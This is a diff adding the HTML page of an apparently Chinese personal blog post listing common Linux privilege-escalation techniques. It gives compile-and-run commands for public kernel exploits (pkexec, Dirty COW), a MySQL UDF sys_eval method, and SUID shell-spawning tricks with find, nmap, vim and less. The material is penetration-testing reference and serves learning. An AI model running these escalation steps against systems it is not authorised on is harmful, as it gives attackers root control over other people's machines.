@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noodp"/>
+    <meta name="author" content="Fumerem">
+    <meta name="description" content="fumerem 的个人博客">
+    
+    
+    <link rel="prev" href="https://fumerem.github.io/2022/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" />
+    
+    <link rel="canonical" href="https://fumerem.github.io/2022/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <title>
+        
+        
+            列举常见linux提权方式 | Fumerem&#39;s Blog
+        
+    </title>
+    <meta name="title" content="列举常见linux提权方式 | Fumerem&#39;s Blog">
+    
+<link rel="stylesheet" href="/css/main.min.css">
+
+
+    
+    
+ 
+
+<script type="application/ld+json">
+{
+    "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/fumerem.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "列举常见linux提权方式",
+    "headline" : "列举常见linux提权方式",
+    "description" : "0x00信息收集 lsb_release -a 查看系统发行版本 uname -a 查看内核版本 whoami 检测当前用户权限 0x01 内核提权 CVE-2021-4034 pkexec 本地提权 https:\/\/github.com\/berdav\/CVE-2021-4034 centos和ubuntu通杀 脏牛提权-CVE",
+    "inLanguage" : "en",
+    "author" : "Fumerem",
+    "creator" : "Fumerem",
+    "publisher": "Fumerem",
+    "accountablePerson" : "Fumerem",
+    "copyrightHolder" : "Fumerem",
+    "copyrightYear" : "2022",
+    "datePublished": "2022-06-12 23:00:52 \u002b0800 CST",
+    "dateModified" : "2022-06-12 23:00:52 \u002b0800 CST",
+    "url" : "https:\/\/fumerem.github.io\/2022\/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F\/",
+    "wordCount" : "1806",
+    "keywords" : [ "penetration_test", "Fumerem\u0027s Blog"]
+}
+</script>
+
+  </head>
+    <body class="">
+        <div class="wrapper">
+            <nav class="navbar">
+    
+        <progress class="content_progress" max="0" value="0"></progress>
+    
+    <div class="container">
+        
+            <div class="navbar-header header-back2home-logo">
+                <span class="logo_mark" >>$</span>
+                <a href="https://fumerem.github.io">
+                    <span class="logo_text" >cd ~</span>
+                    <span class="logo_cursor" ></span>
+                </a>
+            </div>
+        
+        <div class="navbar-right">
+                
+                <span class="menu">
+                
+                <a class="menu-item" href="/posts/" title="">Posts</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <span class="divide"></span>
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-dark-mode"></i></a>
+                </span>
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+    
+        <progress class="content_progress" max="0" value="0"></progress>
+    
+     <div class="container">
+        <div class="navbar">
+            <div class="navbar-header header-logo">
+                    <a href="https://fumerem.github.io">Fumerem&#39;s Blog</a>
+            </div>
+            <div class="navbar-right">
+                <div><a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-dark-mode"></i></a></div>
+                <div class="menu-toggle">
+                    <span></span><span></span><span></span>
+                </div>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                <nav class="mb-md">
+                    
+                    
+                        <a class="menu-item" href="/posts/" title="">
+                            <h3>Posts</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/categories/" title="">
+                            <h3>Categories</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/tags/" title="">
+                            <h3>Tags</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/about/" title="">
+                            <h3>About</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                </nav>
+        </div>
+    </div>
+</nav>
+            <main class="main">
+                <div class="container">
+                    
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">列举常见linux提权方式</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://fumerem.github.io" rel="author">Fumerem</a> with ♥
+                <span class="post-time">
+                on <time datetime=2022-06-12 itemprop="datePublished">June 12, 2022</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        
+                        
+                        
+                          <a href="https://fumerem.github.io/categories/hack/"> hack, </a>
+                        
+                        
+                </span>
+                <span class="post-word-count">1806 words</span>
+        </div>
+    </header>
+
+    <div class="post-content">
+        
+
+        
+        
+            
+        
+
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        <h1 id="0x00信息收集">0x00信息收集</h1>
+<pre tabindex="0"><code>lsb_release -a
+查看系统发行版本
+
+uname -a
+查看内核版本
+
+whoami
+检测当前用户权限
+</code></pre><h1 id="0x01-内核提权">0x01 内核提权</h1>
+<h2 id="cve-2021-4034">CVE-2021-4034</h2>
+<p>pkexec 本地提权</p>
+<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<p>centos和ubuntu通杀</p>
+<p><img src="https://s2.loli.net/2022/05/03/yWLrg8YFnKu3Bpv.png" alt=""></p>
+<h2 id="脏牛提权-cve-2016-5195">脏牛提权-CVE-2016-5195</h2>
+<p>条件: linux内核=&gt;2.6.22</p>
+<p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<pre tabindex="0"><code>gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+mv /tmp/passwd.bak /etc/passwd
+</code></pre><h2 id="cve-2017-16995">CVE-2017-16995</h2>
+<p>影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本</p>
+<p><a href="https://github.com/Al1ex/CVE-2017-16995">https://github.com/Al1ex/CVE-2017-16995</a></p>
+<pre tabindex="0"><code>gcc exploit.c -o exploit
+./exploit
+</code></pre><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
+<p>帮助提取linux系统信息</p>
+<p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<pre tabindex="0"><code>chmod +x /tmp/LinEnum.sh
+sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
+</code></pre><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
+<p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+<p>帮助查看系统存在的提取漏洞</p>
+<pre tabindex="0"><code>perl linux-exploit-suggester-2.pl
+</code></pre><h2 id="kali-searchexploit">kali searchexploit</h2>
+<p>​	searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p>
+<p><strong>语法</strong></p>
+<blockquote>
+<p>searchsploit [options] term1 [term2] &hellip; [termN]</p>
+<p>searchsploit [选项] 关键字1 [关键字2] &hellip; [关键字N]</p>
+</blockquote>
+<p><strong>选项</strong></p>
+<blockquote>
+<p>-c, &ndash;case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。</p>
+<p>-e, &ndash;exact [Term]对exploit标题执行EXACT匹配（默认为AND）</p>
+<p>-h, &ndash;help在屏幕上显示帮助</p>
+<p>-j, &ndash;json[Term]以JSON格式显示结果</p>
+<p>-m, &ndash;mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号</p>
+<p>-o, &ndash;overflow [Term]Exploit标题被允许溢出其列</p>
+<p>-p, &ndash;path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号</p>
+<p>-t, &ndash;title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）</p>
+<p>-u, &ndash;update检查并安装任何exploitdb软件包更新（deb或git）</p>
+<p>-w, &ndash;www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）</p>
+<p>-x, &ndash;examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用</p>
+<p>-v &ndash;verbose 显示更多的输出信息</p>
+<p>&ndash;colour在搜索结果中禁用颜色突出显示.</p>
+<p>&ndash;id显示EDB-ID值而不是本地路径</p>
+<p>&ndash;nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）</p>
+</blockquote>
+<h1 id="0x02-mysql提权">0x02 Mysql提权</h1>
+<p>前提条件:</p>
+<blockquote>
+<p>知道mysql用户名和密码,可以远程执行命令</p>
+<p>mysql有写入文件的权限</p>
+</blockquote>
+<h2 id="1查看mysql有写入文件的权限">1.查看mysql有写入文件的权限</h2>
+<pre tabindex="0"><code>show global variables like &#39;%secure%&#39;;
+</code></pre><blockquote>
+<p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
+当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
+当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
+</blockquote>
+<p>若secure_file_priv不为空白,可以在mysql/my.ini中修改</p>
+<pre tabindex="0"><code> secure_file_priv = &#39; &#39;
+</code></pre><p>然后重启apache服务</p>
+<p>查看plugin位置</p>
+<pre tabindex="0"><code>show variables like &#39;plugin%&#39;;
+</code></pre><p>查看数据库和服务器架构信息</p>
+<pre tabindex="0"><code>select @@version_compile_os, @@version_compile_machine;
+</code></pre><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
+<blockquote>
+<p>1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin</p>
+<p>#若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32</p>
+<p>2.Mysql版本小于5.1：
+如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。
+如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p>
+</blockquote>
+<h3 id="上传">上传</h3>
+<p>利用sqlmap或者大马直接传输udf.dll,没什么好说的</p>
+<h3 id="写文件">写文件</h3>
+<pre tabindex="0"><code>create table temp(data longblob);
+select 0x0....(16进制字节) INTO DUMPFILE &#39;C:\\udf.dll&#39;;
+</code></pre><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
+<h2 id="3创建自定义函数">3.创建自定义函数</h2>
+<pre tabindex="0"><code>create table temp(data longblob);
+select 0x0.... INTO DUMPFILE &#39;C:\\udf.dll&#39;;
+create function sys_eval returns string soname &#39;udf.dll&#39;;   #创建函数sys_eval
+select * from mysql.func where name = &#39;sys_eval&#39;;    #查看创建的sys_eval函数
+select sys_eval(&#39;whoami&#39;);       
+</code></pre><h1 id="0x03-suid提权">0x03 SUID提权</h1>
+<h2 id="1什么是suid">1.什么是SUID</h2>
+<p>SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件)</p>
+<p>比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root.</p>
+<pre tabindex="0"><code>设置SUID
+chmod u+s filename   设置SUID位
+chmod u-s filename   去掉SUID设置
+
+ls -al               查看文件权限
+</code></pre><h2 id="2利用suid提权">2.利用SUID提权</h2>
+<p>常见的拥有SUID的程序有</p>
+<blockquote>
+<pre tabindex="0"><code>nmap
+vim
+find
+bash
+more
+less
+nano
+cp
+awk
+</code></pre></blockquote>
+<p>查看拥有SUID权限的文件,皆可.</p>
+<pre tabindex="0"><code>find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {};
+</code></pre><p>查看文件权限</p>
+<p><img src="https://s2.loli.net/2022/05/03/WlE8fKQnMkUw2FO.png" alt=""></p>
+<p>可见,权限为suid且所有者为root</p>
+<h3 id="nmap202502">nmap(2.02~5.02)</h3>
+<p>早期nmap带有交互模式,运行执行shell命令</p>
+<pre tabindex="0"><code>nmap --interactive
+nmap&gt; !sh
+sh-3.2# whoami
+root
+</code></pre><h3 id="find">find</h3>
+<pre tabindex="0"><code>touch demo
+find demo -exec whoami \;
+find demo -exec &#39;/bin/sh&#39; \;
+</code></pre><h3 id="vim">vim</h3>
+<pre tabindex="0"><code>vim/vi
+:shell
+</code></pre><h3 id="lessmore">less/more</h3>
+<pre tabindex="0"><code>less /etc/passwd
+!/bin/sh
+</code></pre><h3 id="bash">bash</h3>
+<pre tabindex="0"><code>less /etc/passwd
+!/bin/sh
+</code></pre><h3 id="nano">nano</h3>
+<pre tabindex="0"><code>nano #进入nano编辑器
+Ctrl + R
+Ctrl + X
+即可输入命令
+</code></pre>
+    </div>
+
+    <div class="post-copyright">
+            
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Fumerem </span>
+                </p>
+            
+
+            
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://fumerem.github.io/2022/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/>https://fumerem.github.io/2022/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/</span>
+            </p>
+            
+            
+            <p class="copyright-item lincese">
+                This article is licensed under the <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">creative commons attribution 4.0 international license</a>.
+            </p>
+            
+    </div>
+
+
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s):
+            
+            <span class="tag"><a href="https://fumerem.github.io/tags/penetration_test/">
+                    #penetration_test</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> ·
+                <span><a href="https://fumerem.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://fumerem.github.io/2022/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="prev" rel="prev" title="rust编写shellcode加载器"><i class="iconfont icon-left"></i>&nbsp;rust编写shellcode加载器</a>
+        
+        
+    </div>
+
+    <div class="post-comment">
+        
+            
+        
+    </div>
+</article>
+                </div>
+            </main>
+            <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2021 - 2022</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i>
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://fumerem.github.io">Fumerem</a> | </span>
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/wujunze/hugo-theme-geek" target="_blank" rel="external nofollow">Hugo-theme-geek</a></span>
+    </div>
+</footer>
+
+
+
+
+
+<script src="/js/vendor_main.min.js" defer ></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
+<script> pangu.spacingPage();</script>
+
+
+
+        </div>
+    </body>
+</html>
